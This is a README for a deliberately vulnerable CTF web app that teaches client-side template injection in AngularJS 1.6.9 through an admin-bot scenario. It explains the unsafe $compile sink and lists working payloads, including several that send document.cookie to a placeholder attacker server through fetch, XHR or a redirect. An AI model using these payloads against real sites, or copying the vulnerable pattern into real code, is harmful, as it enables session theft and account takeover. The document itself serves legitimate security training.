# 🌿 Eco-Secure Store — CSTI CTF Challenge

A deliberately vulnerable e-commerce web application for CTF competitions featuring **Client-Side Template Injection (CSTI) with a Bot Trigger**.

## Quick Start

### Prerequisites
- Docker & Docker Compose
- Node.js 18+ (for local development)

### Running with Docker (Recommended)

```bash
# Build and start
docker-compose up -d

# View logs
docker-compose logs -f

# Stop
docker-compose down
```

App available at **`http://localhost:3000`**

### Running Locally

```bash
npm install
npm start
```

---

## Challenge Overview

| Property | Value |
|---|---|
| **Category** | Web Exploitation |
| **Difficulty** | Medium |
| **Vulnerability** | CSTI (Client-Side Template Injection) |
| **Framework** | AngularJS 1.6.9 |
| **Bot** | Puppeteer (Chromium headless) |

### Objective

1. Login with guest credentials (`guest` / `guest`)
2. Submit a support ticket with a CSTI payload in the **Description** field
3. Click **"Request Admin Review"** to trigger the admin bot
4. The bot visits the ticket URL with its `session_id` cookie set
5. Your payload executes and exfiltrates the cookie to your listener
6. Use the stolen cookie to access `/admin` and retrieve the flag

---

## Why CSTI Works Here

The `ticket.html` page uses **AngularJS 1.6.9**, which **completely removed its expression sandbox**. The ticket description is injected as raw HTML into the DOM and then compiled by Angular's `$compile` service:

```js
container.innerHTML = ticket.description;   // User content → DOM
$compile(container)($scope);                // Angular evaluates {{ }} expressions
```

This means any `{{ }}` expression in the description is **evaluated as live Angular code**.

---

## ✅ Working CSTI Payloads

All of the following work in the **Description** field of the support ticket:

### Basic Proof-of-Concept
```
{{7*7}}
```
> Renders `49` — confirms Angular is processing the template

### Constructor Chain (Alert)
```
{{constructor.constructor('alert(1)')()}}
```
> Works because AngularJS 1.6.x has **no sandbox** — direct access to `Function` constructor

### $eval-based (Alert)
```
{{$eval.constructor('alert(document.cookie)')()}}
```
> Uses `$eval`'s constructor chain to reach `Function`

### Cookie Exfiltration via fetch()
```
{{constructor.constructor('fetch("https://YOUR-SERVER.com/?c="+document.cookie)')()}}
```
> The admin bot visits the page with its `session_id` cookie. This payload sends it to your listener.

### Fetch + .then() chaining
```
{{constructor.constructor('fetch("https://example.com").then(r=>r.text()).then(t=>t.length)')()}}
```
> Demonstrates async fetch chaining works inside CSTI

### XHR-based Exfiltration (no fetch)
```
{{constructor.constructor('var x=new XMLHttpRequest();x.open("GET","https://YOUR-SERVER.com/?c="+document.cookie);x.send()')()}}
```

### Location Redirect (confirm cookie access)
```
{{constructor.constructor('location="https://YOUR-SERVER.com/?c="+document.cookie')()}}
```

---

## Default Credentials

| Role | Username | Password |
|---|---|---|
| Guest | `guest` | `guest` |
| Admin | — | (session cookie only, set by bot) |

---

## Architecture

```
Player Browser                  Server (Node/Express)           Admin Bot (Puppeteer)
      │                                 │                               │
      ├─ POST /api/tickets ────────────►│ stores ticket in memory       │
      │                                 │                               │
      ├─ POST /api/report ─────────────►│ exec("node admin-bot.js ID") ─┤
      │                                 │                               │
      │                                 │               ┌───────────────┤
      │                                 │               │ Sets cookie:  │
      │                                 │               │ session_id=.. │
      │                                 │               │               │
      │                                 │               │ Visits:       │
      │                                 │               │ /ticket-view  │
      │                                 │               │ ?id=<ticketId>│
      │                                 │               │               │
      │                                 │               │ CSTI fires!   │
      │                                 │               │ Cookie sent   │
      │                                 │               │ to attacker   │
```

---

## Files

| File | Purpose |
|---|---|
| `server.js` | Express backend — ticket API, flag endpoint, bot trigger |
| `admin-bot.js` | Puppeteer bot — sets admin cookie, visits ticket URL |
| `public/index.html` | Main app — login + ticket submission (AngularJS 1.6.9) |
| `public/ticket.html` | **Vulnerable page** — CSTI sink via `$compile` |
| `public/js/app.js` | AngularJS controllers — SCE disabled, `$compile` used |
| `admin.html` | Admin dashboard — shows flag if correct cookie |
| `.env` | Config — `FLAG`, `ADMIN_COOKIE`, credentials |

> ⚠️ **Intentionally vulnerable** — for educational CTF use only. Never deploy in production.
